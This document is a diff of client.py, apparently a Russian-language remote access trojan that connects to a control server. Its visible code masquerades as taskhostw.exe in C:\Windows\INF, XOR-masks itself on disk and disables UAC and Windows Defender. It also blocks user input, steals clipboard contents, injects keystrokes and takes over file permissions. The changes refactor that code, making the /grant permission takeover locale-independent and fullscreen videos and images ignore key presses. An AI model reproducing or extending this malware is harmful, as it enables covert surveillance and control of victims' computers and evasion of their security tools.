@@ -1,3 +1,4 @@
+# client.py
 import importlib.util
 import types
 import inspect
@@ -40,9 +41,7 @@ import struct
 # Настройка логирования
 logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(levelname)s: %(message)s', handlers=[logging.StreamHandler()])
 logger = logging.getLogger(__name__)
-
-def check_cython_load(): # Нужно при использовании Cython
-    return True
+    
     
 # ====== Автоопределение CLIENT_ID ======
 def get_hwid():
@@ -132,34 +131,55 @@ SERVER_IP, SERVER_PORT = get_buffer_process()
 RECONNECT_DELAY = 15
 
 # ====== Глобальные переменные ======
-CURRENT_VERSION = 37
+
+# --- Версия и ограничения ---
+CURRENT_VERSION = 38
 MAX_LEN = 4000
+
+# --- Пути ---
 TARGET_DIR = r"C:\Windows\INF"
-new_name="taskhostw.exe"
-stop_event = threading.Event()
-auto_thread = None
+current_path = os.path.expanduser("~")
+DISABLED_PLUGINS_FILE = os.path.join(
+    os.getenv('APPDATA', current_path),
+    'SystemData',
+    'plugins_config.json'
+)
+
+# --- Имена / параметры ---
+new_name = "taskhostw.exe"
+HB_INTERVAL = 5  # Серцебиение
+
+# --- Сетевое состояние ---
+current_socket = None
 socket_lock = threading.Lock()
 send_lock = threading.Lock()
-current_socket = None
+
+# --- Потоки и идентификаторы ---
 current_thread_id = None
-current_path = os.path.expanduser("~")
+auto_thread = None
 video_thread = None
-video_stop_event = threading.Event()
-file_lock = threading.Lock()
-_mixer_initialized = False
 music_thread = None
-music_stop_event = threading.Event() 
-mouse_mess_stop_event = threading.Event()
-HB_INTERVAL = 10 # Отправляем каждые 10 секунд
-COMMANDS_REGISTRY = {} # Сюда будут попадать все команды
-MODULES_METADATA = {}  # Здесь храним данные для панели управления
-DISABLED_PLUGINS_FILE = os.path.join(os.getenv('APPDATA'), 'SystemData', 'plugins_config.json')
-hb_stop_event = threading.Event()
 mouse_mess_thread = None
 
+# --- Events ---
+stop_event = threading.Event()
+video_stop_event = threading.Event()
+music_stop_event = threading.Event()
+mouse_mess_stop_event = threading.Event()
+hb_stop_event = threading.Event()
+
+# --- Синхронизация файлов ---
+file_lock = threading.Lock()
+
+# --- Аудио ---
+_mixer_initialized = False
+
+# --- Реестры ---
+COMMANDS_REGISTRY = {}
+MODULES_METADATA = {}
+
+
 # ====== Вспомогательные функции ======
-
-
 def is_good_window(hwnd):
     if not win32gui.IsWindowVisible(hwnd):
         return False
@@ -224,6 +244,7 @@ def force_focus_window(hwnd):
     except:
         return False
 
+
 def enable_aggressive_keepalive(sock):
     """
     Включает агрессивный TCP Keepalive для Windows.
@@ -242,6 +263,7 @@ def enable_aggressive_keepalive(sock):
         logger.info("Агрессивный Keepalive включен.")
     except Exception as e:
         logger.error(f"Не удалось включить Keepalive: {e}")
+
 
 def XOR_cipher(data: bytes, key="STORMZOV") -> bytes:
     """Шифрование XOR для маскировки кода на диске"""
@@ -273,6 +295,7 @@ def save_disabled_list(disabled_list):
             json.dump(disabled_list, f)
     except: pass
 
+
 ############################
 
 def kill_parent_stub():
@@ -289,6 +312,7 @@ def kill_parent_stub():
             logger.debug("[INFO] Родительский процесс не найден")
     except Exception as e:
         logger.debug(f"[ERROR] Не удалось завершить родительский процесс: {e}")
+
 
 def disable_uac():
     """
@@ -322,7 +346,7 @@ def disable_uac():
         return False
 
 
-""" # Старая функция автозапуска
+"""
 def change_shell():
     logger.info("Изменение shell запущено")
     try:
@@ -715,6 +739,7 @@ def cmd_grant(args):
     """
     /grant <путь>
     Многоуровневая разблокировка доступа в фоновом режиме с итоговым отчетом.
+    Локалезависимость устранена (используются SID).
     """
     if not args:
         return "❌ Укажите путь к файлу или папке."
@@ -727,64 +752,91 @@ def cmd_grant(args):
     if not os.path.exists(target_path):
         return f"❌ Объект не найден: {target_path}"
 
-    # Функция, которая будет крутиться в фоне
     def heavy_lifting(path, sock_to_use):
         report = [f"🏁 Итог по доступу: `{os.path.basename(path)}`"]
-        
+
         try:
-            # 1. Атрибуты
-            subprocess.run(f'attrib -r -s -h "{path}" /s /d', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
-            report.append("✅ Атрибуты (Read-only/System) сняты.")
-
-            # 2. Владелец
-            res_take = subprocess.run(f'takeown /f "{path}" /a /r /d y', 
-                                      shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
-            if res_take.returncode == 0:
-                report.append("✅ Владение передано группе Администраторов.")
-            else:
-                report.append("⚠️ Takeown завершен с замечаниями (возможно, часть файлов уже под контролем).")
-
-            # 3. Права доступа (ICACLS)
-            # Пытаемся выдать права для всех возможных имен групп (RU/EN)
-            found_groups = []
-            for group in ["Administrators", "Everyone", "Администраторы", "Все"]:
-                cmd = f'icacls "{path}" /grant {group}:F /t /c /q'
-                res = subprocess.run(cmd, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
-                if res.returncode == 0:
-                    found_groups.append(group)
-            
-            if found_groups:
-                report.append(f"✅ Права 'Full Control' выданы для: {', '.join(found_groups)}.")
-
-            # 4. PowerShell (финальный аккорд для сложных случаев)
-            ps_cmd = (
-                f"$path='{path}'; "
-                "Get-Item $path | ForEach-Object { "
-                "$acl = Get-Acl $_.FullName; "
-                "$rule = New-Object System.Security.AccessControl.FileSystemAccessRule('Everyone','FullControl','Allow'); "
-                "$acl.SetAccessRule($rule); Set-Acl $_.FullName $acl }"
+            # 1. Снятие атрибутов (локалезависимости нет)
+            subprocess.run(
+                f'attrib -r -s -h "{path}" /s /d',
+                shell=True,
+                creationflags=subprocess.CREATE_NO_WINDOW
             )
-            subprocess.run(["powershell", "-NoProfile", "-Command", ps_cmd], creationflags=subprocess.CREATE_NO_WINDOW)
-            report.append("✅ PowerShell корректировка завершена.")
+            report.append("✅ Атрибуты (Read-only/System/Hidden) сняты.")
+
+            # 2. Захват владения (SID Administrators)
+            res_take = subprocess.run(
+                f'takeown /f "{path}" /a /r /d y',
+                shell=True,
+                capture_output=True,
+                creationflags=subprocess.CREATE_NO_WINDOW
+            )
+            if res_take.returncode == 0:
+                report.append("✅ Владение передано группе Administrators (SID).")
+            else:
+                report.append("⚠️ Takeown завершён с замечаниями.")
+
+            # 3. Выдача прав через icacls (ТОЛЬКО SID)
+            sids = {
+                "Administrators": "S-1-5-32-544",
+                "Everyone": "S-1-1-0",
+            }
+
+            granted = []
+            for name, sid in sids.items():
+                cmd = f'icacls "{path}" /grant *{sid}:F /t /c /q'
+                res = subprocess.run(
+                    cmd,
+                    shell=True,
+                    creationflags=subprocess.CREATE_NO_WINDOW
+                )
+                if res.returncode == 0:
+                    granted.append(name)
+
+            if granted:
+                report.append(f"✅ Full Control выдано: {', '.join(granted)}.")
+            else:
+                report.append("⚠️ icacls не сообщил об успешных изменениях.")
+
+            # 4. PowerShell (контрольный, через SID Everyone)
+            ps_cmd = (
+                f"$path = '{path}'; "
+                "$sid = New-Object System.Security.Principal.SecurityIdentifier('S-1-1-0'); "
+                "$rule = New-Object System.Security.AccessControl.FileSystemAccessRule("
+                "$sid, 'FullControl', 'ContainerInherit,ObjectInherit', 'None', 'Allow'); "
+                "$acl = Get-Acl $path; "
+                "$acl.SetAccessRule($rule); "
+                "Set-Acl $path $acl"
+            )
+
+            subprocess.run(
+                ["powershell", "-NoProfile", "-Command", ps_cmd],
+                creationflags=subprocess.CREATE_NO_WINDOW
+            )
+
+            report.append("✅ PowerShell ACL-коррекция выполнена.")
 
             final_msg = "\n".join(report)
-            
+
         except Exception as e:
             final_msg = f"❌ Ошибка при выполнении /grant для {path}: {str(e)}"
 
-        # ОТПРАВКА ИТОГА: используем существующую функцию отправки
-        # Мы обращаемся к глобальному сокету напрямую из потока
+        # Отправка результата
         try:
             if sock_to_use:
                 send_response(sock_to_use, final_msg)
-        except:
-            pass # Если сокет закрылся, пока мы работали
+        except Exception:
+            pass
 
-    # Запускаем поток, передавая ему текущий сокет для ответа
-    # Используем current_socket из глобальной области видимости
-    thread = threading.Thread(target=heavy_lifting, args=(target_path, current_socket), daemon=True)
+    # Запуск фонового потока
+    thread = threading.Thread(
+        target=heavy_lifting,
+        args=(target_path, current_socket),
+        daemon=True
+    )
     thread.start()
-    return f"⏳Захват прав для `{os.path.basename(target_path)}`...\nЭто займет время"
+
+    return f"⏳ Захват прав для `{os.path.basename(target_path)}`...\nЭто займет некоторое время."
 
 
 def cmd_version(args):
@@ -869,7 +921,7 @@ def cmd_changeclipboard(args):
         return f'❌ Ошибка: {e}'
 
 
-def get_clipboard_content(args):
+def cmd_getclipboard(args):
     """Получает текстовое содержимое буфера обмена."""
     CF_TEXT = 1
     
@@ -919,7 +971,7 @@ def get_clipboard_content(args):
 
 
 # ====== Блокировка/Разблокировка ввода ======
-def block_input(args):
+def cmd_block(args):
     """Блокирует ввод пользователя (мышь и клавиатура)."""
     try:
         ctypes.windll.user32.BlockInput(True)
@@ -928,7 +980,7 @@ def block_input(args):
         return f"❌ Ошибка блокировки ввода: {e}"
 
 
-def unblock_input(args):
+def cmd_unblock(args):
     """Снимает блокировку ввода пользователя."""
     try:
         # Снимаем блокировку
@@ -1255,7 +1307,7 @@ def cmd_keypress(args):
         return f"Ошибка: {e}"
 
 
-def simulate_key_type(args):
+def cmd_keytype(args):
     """Вводит текст целиком, без пробелов между символами."""
     if not args:
         return "Используйте: /keytype <текст>"
@@ -1276,6 +1328,7 @@ def cmd_altf4(args):
         return '✅ Нажато ALT + F4.'
     except Exception as e:
         return f'❌ Ошибка: {e}'
+
 
 # ====== Управление мышью ======
 def cmd_mouseclick(args):
@@ -1499,7 +1552,6 @@ del "%~f0"
 
 
 # ====== Управление музыкой ======
-
 def cmd_playsound(args, conn):
     global music_thread, _mixer_initialized
 
@@ -1896,8 +1948,12 @@ def cmd_open_image(args, conn):
         
         send_response(conn, f"✅ Изображение '{user_path}' открыто на {seconds} сек. (Поверх всех)")
 
-        # 5. Ждем N миллисекунд ИЛИ нажатия любой клавиши.
-        cv2.waitKey(seconds * 1000) 
+        # 5. Ждём ТОЛЬКО по времени, нажатия клавиш игнорируются
+        end_time = time.time() + seconds
+        
+        while time.time() < end_time:
+            cv2.waitKey(50)  # просто даёт GUI обновляться
+        
         
     except Exception as e:
         send_response(conn, f"❌ Ошибка во время показа изображения (GUI/Full-Screen): {e}")
@@ -1907,80 +1963,8 @@ def cmd_open_image(args, conn):
         cv2.waitKey(1)
 
 
-def video_play_task(path):
-    win_name = "elite"
-
-    try:
-        cap = cv2.VideoCapture(path)
-        if not cap.isOpened():
-            logger.error("Не удалось открыть видео")
-            return
-
-        cv2.namedWindow(win_name, cv2.WINDOW_NORMAL)
-
-        # 🔥 РЕАЛЬНЫЙ FULLSCREEN
-        cv2.setWindowProperty(
-            win_name,
-            cv2.WND_PROP_FULLSCREEN,
-            cv2.WINDOW_FULLSCREEN
-        )
-
-        # ⏳ Ждём пока окно реально появится
-        hwnd = None
-        for _ in range(50):  # ~1 сек
-            hwnd = win32gui.FindWindow(None, win_name)
-            if hwnd:
-                break
-            time.sleep(0.02)
-
-        if hwnd:
-            # 🔥 ЖЁСТКО ПОВЕРХ ВСЕХ ОКОН
-            win32gui.SetWindowPos(
-                hwnd,
-                win32con.HWND_TOPMOST,
-                0, 0, 0, 0,
-                win32con.SWP_NOMOVE | win32con.SWP_NOSIZE
-            )
-
-            # убрать рамки и фокус
-            style = win32gui.GetWindowLong(hwnd, win32con.GWL_STYLE)
-            win32gui.SetWindowLong(
-                hwnd,
-                win32con.GWL_STYLE,
-                style & ~(
-                    win32con.WS_CAPTION |
-                    win32con.WS_THICKFRAME |
-                    win32con.WS_MINIMIZE |
-                    win32con.WS_MAXIMIZE |
-                    win32con.WS_SYSMENU
-                )
-            )
-
-        fps = cap.get(cv2.CAP_PROP_FPS)
-        delay = int(1000 / fps) if fps > 0 else 33
-
-        while not video_stop_event.is_set():
-            ret, frame = cap.read()
-            if not ret:
-                break
-
-            cv2.imshow(win_name, frame)
-
-            # ESC — выход
-            if cv2.waitKey(delay) & 0xFF == 27:
-                break
-
-        cap.release()
-        cv2.destroyAllWindows()
-
-    except Exception as e:
-        logger.error(f"Video error: {e}")
-    finally:
-        video_stop_event.clear()
-
-
 def cmd_open_video(args):
-    global video_thread
+    global video_thread, video_stop_event
 
     if not args:
         return "❌ Укажите путь к видео"
@@ -1988,6 +1972,8 @@ def cmd_open_video(args):
     path = args.strip()
     if not os.path.isabs(path):
         path = os.path.join(current_path, path)
+
+    path = os.path.abspath(path)
 
     if not os.path.isfile(path):
         return "❌ Видео не найдено"
@@ -1998,14 +1984,83 @@ def cmd_open_video(args):
         video_thread.join(timeout=1)
 
     video_stop_event.clear()
+
+    def video_worker(video_path):
+        win_name = "elite"
+
+        try:
+            cap = cv2.VideoCapture(video_path)
+            if not cap.isOpened():
+                logger.error("Не удалось открыть видео")
+                return
+
+            cv2.namedWindow(win_name, cv2.WINDOW_NORMAL)
+            cv2.setWindowProperty(
+                win_name,
+                cv2.WND_PROP_FULLSCREEN,
+                cv2.WINDOW_FULLSCREEN
+            )
+
+            # ждём появления окна
+            hwnd = None
+            for _ in range(50):
+                hwnd = win32gui.FindWindow(None, win_name)
+                if hwnd:
+                    break
+                time.sleep(0.02)
+
+            if hwnd:
+                # поверх всех окон
+                win32gui.SetWindowPos(
+                    hwnd,
+                    win32con.HWND_TOPMOST,
+                    0, 0, 0, 0,
+                    win32con.SWP_NOMOVE | win32con.SWP_NOSIZE
+                )
+
+                # убрать рамки
+                style = win32gui.GetWindowLong(hwnd, win32con.GWL_STYLE)
+                win32gui.SetWindowLong(
+                    hwnd,
+                    win32con.GWL_STYLE,
+                    style & ~(
+                        win32con.WS_CAPTION |
+                        win32con.WS_THICKFRAME |
+                        win32con.WS_MINIMIZE |
+                        win32con.WS_MAXIMIZE |
+                        win32con.WS_SYSMENU
+                    )
+                )
+
+            fps = cap.get(cv2.CAP_PROP_FPS)
+            delay = int(1000 / fps) if fps > 0 else 33
+
+            while not video_stop_event.is_set():
+                ret, frame = cap.read()
+                if not ret:
+                    break
+
+                cv2.imshow(win_name, frame)
+
+                # клавиши игнорируем, нужно только обновление GUI
+                cv2.waitKey(delay)
+
+            cap.release()
+            cv2.destroyAllWindows()
+
+        except Exception as e:
+            logger.error(f"Video error: {e}")
+        finally:
+            video_stop_event.clear()
+
     video_thread = threading.Thread(
-        target=video_play_task,
+        target=video_worker,
         args=(path,),
         daemon=True
     )
     video_thread.start()
 
-    return "🎬 Видео запущено (без звука, поверх всех окон)"
+    return "🎬 Видео запущено (fullscreen, поверх всех окон)"
 
 
 def cmd_close_video(args):
@@ -2048,6 +2103,7 @@ def send_file(conn, file_path):
 
     except Exception as e:
         return f"❌ Ошибка при отправке файла: {str(e)}"
+
 
 def send_response(conn, result, cmd_name="N/A", is_file=False, file_path=None):
     global current_thread_id 
@@ -2099,6 +2155,7 @@ def send_response(conn, result, cmd_name="N/A", is_file=False, file_path=None):
 
     except Exception as e:
         logger.error(f"Ошибка отправки ответа/файла: {e}")
+
 
 # ====== Скриншоты и фото (Добавлен ответ) ======
 def cmd_screenshot(args, conn):
@@ -2909,9 +2966,7 @@ def cmd_wd_exclude(args):
 
 def cmd_killwindef(args):
     """
-    Команда /killwindef
     Отключает Windows Defender (включая Real-Time Protection) через реестр.
-    Требует прав администратора (а у тебя клиент уже копируется в C:\Windows\INF и запускается оттуда → права есть).
     """
     try:
         logger.info("Выполняется отключение Windows Defender через реестр...")
@@ -3337,10 +3392,10 @@ CORE_COMMANDS = {
     "/playsound": cmd_playsound,
     "/stopsound": cmd_stopsound,
     "/mousemesstop": cmd_mousemesstop,
-    "/block": block_input,
-    "/unblock": unblock_input,
-    "/clipboard": get_clipboard_content,
-    "/keytype": simulate_key_type,
+    "/block": cmd_block,
+    "/unblock": cmd_unblock,
+    "/clipboard": cmd_getclipboard,
+    "/keytype": cmd_keytype,
     "/ping": cmd_ping,  
     "/mic": cmd_mic,            
     "/webcam": cmd_webcam_video, 
@@ -3484,7 +3539,7 @@ def main_client_loop():
                                     threading.Thread(target=func, args=(args, conn), daemon=True).start()
                                     result = None
                                 else:
-                                    logger.info(f"Вызываю плагин с сокетом: {conn}")
+                                    #logger.info(f"Вызываю команду с сокетом: {conn}")
                                     result = func(args, conn)
 
                             # Сценарий В: Обычная функция (args) -> большинство команд и плагинов
